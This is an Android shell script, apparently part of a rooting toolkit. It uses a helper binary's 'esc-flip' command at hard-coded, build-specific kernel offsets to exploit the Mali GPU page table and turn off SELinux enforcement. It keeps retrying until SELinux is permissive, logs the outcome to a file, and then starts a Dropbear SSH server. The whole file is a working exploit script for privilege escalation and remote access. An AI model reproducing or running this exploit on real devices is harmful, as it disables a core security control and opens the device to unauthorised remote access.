#!/system/bin/sh
# Exploits GPU Mali page table via esc-flip to set selinux_enforcing = 0 in kernel memory
echo 0 > /sys/fs/selinux/enforce 2>/dev/null
/vendor/bin/setenforce 0 2>/dev/null

BUILD=$(getprop ro.build.display.id)
OFFSET="0x291352c"
case "$BUILD" in
    *20201111*)
        OFFSET="0x2a5052c"
        ;;
esac

[ -x /odm/bin/permissive ] && PERM=/odm/bin/permissive || PERM=/data/local/tmp/permissive

"$PERM" esc-flip "$OFFSET" 1 0 2>/dev/null

while [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "1" ]; do
    "$PERM" esc-flip "$OFFSET" 1 0 2>/dev/null
    sleep 3
done

/vendor/bin/setenforce 0 2>/dev/null
echo 0 > /sys/fs/selinux/enforce 2>/dev/null

ENF=$(cat /sys/fs/selinux/enforce 2>/dev/null)
echo "fix-enforce: build=$BUILD offset=$OFFSET final enforce=$ENF" >> /data/local/tmp/rootd.log

# Guaranteed launch of Dropbear SSH once Permissive
/odm/bin/start-dropbear.sh &
